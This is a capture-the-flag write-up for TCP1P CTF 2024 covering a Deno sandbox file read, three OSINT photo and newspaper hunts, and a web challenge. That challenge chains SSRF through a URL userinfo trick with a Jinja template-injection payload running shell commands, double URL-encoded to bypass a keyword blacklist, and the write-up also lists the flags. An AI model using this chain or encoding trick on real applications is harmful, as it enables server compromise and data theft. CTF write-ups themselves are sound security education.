# TCP1P CTF

## Welcome

### Solution

On discord profile for bot at TCP1Ps [Discord Server](https://discord.gg/RQ5e3EW5dA)


<details>
<summary>Flag</summary>

`TCP1P{Welcome_To_TCP1P_CTF_2024_Discord}`
</details>



## Denis JS (old)

### Solution

#### First

```js
console.log([...Deno.readDirSync('/').map(file => file.name)]);
```

#### Second

```js
console.log(Deno.readTextFileSync('/flag-d53212042bb1b2dd56129c909bc93350'));
```

#### Combined

```js
console.log(Deno.readTextFileSync('/' + [...Deno.readDirSync('/').map(file => file.name)].find(name => name.startsWith('flag'))));
```

<details>
<summary>Flag</summary>

`TCP1P{HOpe_N49I_DidNt_5eE_i_uSe_h1S_p4yLO4d_T0_50lve_tHI5_ch41LEnGe}`
</details>



## Bandit

### Task

An Jieyab as informant took a photo of a vehicle, can you find the location?

The flag is name the location and date example TCP1P{Town, Coutry. Month Year}

#### Image

![task](assets/suspect.jpg)

### Solution

A google serach of `N 1700 go indinesia car license plate` gives https://platesmania.com/id/gallery.php?gal=id&ctype=1&nomer=N+1700+GO

<details>
<summary>Flag</summary>

`TCP1P{Malang, Indonesia. October 2019}`
</details>



## The Investigator

### Task

Help Jieyab found the newspaper. When was this newspaper published?

The flag name is date TCP1P{Date Month Year}

#### Image

![task](<assets/PETRUS roeit Indonesische misdaad uit.png>)

### Solution

A google seach led me to this page wher you can sarch in old german newspapers. https://www.delpher.nl/nl/kranten/results?query=Links+Frankrijk+wil+rechtse+pers+breken&page=1&coll=ddd

A search for the title of the paper gives me the exact same paper:
Then I found the https://www.delpher.nl/nl/kranten/view?query=Links+Frankrijk+wil+rechtse+pers+breken&coll=ddd&identifier=ddd:011205843:mpeg21:a0736&resultsidentifier=ddd:011205843:mpeg21:a0736&rowid=1

<details>
<summary>Flag</summary>

`TCP1P{17 December 1983}`
</details>



## Night Live at Indonesian

### Task

Oeman is a nightlife maniac tourist in 2007 - 2010, he came back to Indonesia to enjoy the nightlife but the place was closed, what was the name of the place? And who was the person who closed the place?

The flag is name of Man was close the place and the birth date example TCP1P{Abdul Risna Ardana, 14 July 1669}

#### Image 1

![taskimage1](assets/1.jpg)

#### Image 2

![taskimage2](assets/2.jpg)

#### Image 3

[taskimage3](assets/3.jpg)

#### Image 4

![taskimage4](assets/4.jpg)

#### Image 5

![taskimage5](assets/5.jpg)

### Solution

Reverse image search of the emblem saying 16 reveals the club is Jakarta Stadium
Then i find this article: https://www.vice.com/en/article/whats-stopping-stadium-from-reopening/ mentioning that it was the city gouvernor who closed it:
Basuki Tjahaja Purnama, 29. juni 1966

<details>
<summary>Flag</summary>

`TCP1P{Basuki Tjahaja Purnama, 29 June 1966}`
</details>



## Hacked

### Task

### Solution

This task consisted of multiple parts with different workarounds

The first challenge it to reach `/secret` and still fulfill requirements of `@is_from_localhost`. To do that we can proxy through the `/`. The backend for this looks like this:

```py
url = request.args.get('url')

list_endpoints = [
    '/about/',
    '/portfolio/',
]

target_url = "http://daffa.info" + url

if target_url.startswith("http://daffa.info") and any(target_url.endswith(endpoint) for endpoint in list_endpoints):
    # fetch url
```
to do that we will call this:

```bash
curl ctf.tcp1p.team:10012/?url=@localh.st:1337/secret?dummy=/about/
```
* The **@** acts to remove the `http://daffa.info` from the prexied url by setting it as a "username".
* The **dummy=/about/** at the end is also there to fake that the end of the url is `/about/`.
* The **localh.st** acts as a middle man that redirects so it looks like the request comes from localhost as we can read more about [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md).

Now we have successfully been redirected to the secret page, but it requires an admin parameter so it doesnt further redirect us:

```py
if not request.args.get('admin'):
    abort(403) 
```

```bash
curl ctf.tcp1p.team:10012/?url=@localh.st:1337/secret?admin=loremipsum%26dummy=/about/
```

We have now accessed the page and can now try to attack the `render_template_string(template)`. We try:

```py
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat ../*.txt').read()}}
```

Now we encounter a third issue. The requests of `/` are passed through a blacklist:

```py
blacklist = ["debug", "args", "headers", "cookies", "environ", "values", "query",
    "data", "form", "os", "system", "popen", "subprocess", "globals", "locals",
    "self", "lipsum", "cycler", "joiner", "namespace", "init", "join", "decode",
    "module", "config", "builtins", "import", "application", "getitem", "read",
    "getitem", "mro", "endwith", " ", "'", '"', "_", "{{", "}}", "[", "]", "\\", "x"]
```

As we can see we are not allowed to write `{{` and `}}` for our jinja template injection, and also most of our functions are blacklisted.

Therefore we need to encode this in some way. Because the blacklist check is in `/` before we get redirected we can url encode the string twice so it doesnt unveil our true payload before it has gone through the proxy. CyberChefs URL encode cannot do this task, because it doesnt encode all symbols. Therefor we used some other [online tool](https://onlinetexttools.com/url-encode-text)

```bash
curl ctf.tcp1p.team:10012/?url=@localh.st:1337/secret?admin=%25%37%42%25%37%42%25%37%33%25%36%35%25%36%43%25%36%36%25%32%45%25%35%46%25%35%46%25%36%39%25%36%45%25%36%39%25%37%34%25%35%46%25%35%46%25%32%45%25%35%46%25%35%46%25%36%37%25%36%43%25%36%46%25%36%32%25%36%31%25%36%43%25%37%33%25%35%46%25%35%46%25%32%45%25%35%46%25%35%46%25%36%32%25%37%35%25%36%39%25%36%43%25%37%34%25%36%39%25%36%45%25%37%33%25%35%46%25%35%46%25%32%45%25%35%46%25%35%46%25%36%39%25%36%44%25%37%30%25%36%46%25%37%32%25%37%34%25%35%46%25%35%46%25%32%38%25%32%37%25%36%46%25%37%33%25%32%37%25%32%39%25%32%45%25%37%30%25%36%46%25%37%30%25%36%35%25%36%45%25%32%38%25%32%37%25%36%33%25%36%31%25%37%34%25%32%30%25%32%45%25%32%45%25%32%46%25%32%41%25%32%45%25%37%34%25%37%38%25%37%34%25%32%37%25%32%39%25%32%45%25%37%32%25%36%35%25%36%31%25%36%34%25%32%38%25%32%39%25%37%44%25%37%44%26dummy=/about/
```

<details>
<summary>Flag</summary>

`TCP1P{Ch41n1ng_SsRF_pLu5_5St1_ba83f3ff121ba83f3ff121}`
</details>



## Doxxed

### Solution

```bash
echo VENQMVB7ODNmZTAzNGIyY2ZiMDlkZWFmYmI5NTViMDMzOTJhMDgzZDhmODNiMn0K | base64 -d
```

<details>
<summary>Flag</summary>

`TCP1P{83fe034b2cfb09deafbb955b03392a083d8f83b2}`
</details>